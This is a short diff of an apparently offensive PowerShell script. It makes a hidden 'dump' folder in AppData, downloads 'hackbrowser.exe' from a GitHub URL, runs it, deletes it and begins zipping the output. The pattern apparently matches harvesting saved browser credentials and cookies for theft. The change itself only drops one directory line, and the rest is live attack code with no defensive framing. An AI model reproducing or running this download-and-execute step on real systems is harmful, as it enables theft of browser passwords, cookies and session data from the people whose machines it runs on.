@@ -8,7 +8,6 @@ mkdir "$env:appdata\dump"
 Set-Location "$env:appdata\dump"
 #Downloading and executing hackbrowser.exe
 Invoke-WebRequest -Uri "https://github.com/pabloleal2000/digis/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
-cd $env:appdata\Local\dump
 ./hb.exe
 Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
 #Creating A Zip Archive
